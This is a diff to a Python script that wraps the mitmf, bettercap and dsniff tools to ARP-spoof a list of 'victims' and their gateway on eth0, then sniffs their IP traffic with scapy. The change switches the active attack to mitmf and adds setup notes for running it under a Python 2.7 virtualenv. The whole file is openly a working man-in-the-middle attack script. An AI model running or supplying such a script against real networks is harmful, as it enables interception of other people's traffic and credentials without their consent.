@@ -37,17 +37,25 @@ def bettercap():
 	os.system(cmd)
 	
 def mitmf():
+	""" This framewoerk doesn't have a python3 version and have so many dependencies
+	that the authors opt to make it's instalation using virtual env. In order to make it
+	be executable from os.system(), create an alias for it adding the following line to
+	your .bashrc or .zshrc:
+	
+	alias mitmf="/path/to/virtualenv/python2.7 /path/to/mitmf.py"
+	"""
 	targets = ""
 	for v in victims:
 		targets += v + ',' 
 	targets = targets.rstrip(',')
 	cmd = """
-	python mitmf -i eth0 \
+	vpython mitmf -i eth0 \
 		--spoof \
 		--arp \
 		--target {}, \
 		--gateway {} \
 	""".format(targets, GATEWAY_ADDRESS)
+	print(cmd)
 	os.system(cmd)
 
 def dsniff():
@@ -62,9 +70,9 @@ def dsniff():
 	os.system(cmd)
 
 def main():
-	#dsniff()
-	bettercap()
-	#mitmf()
+	#dsniff() 
+	#bettercap()
+	mitmf()
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
 	except PermissionError:
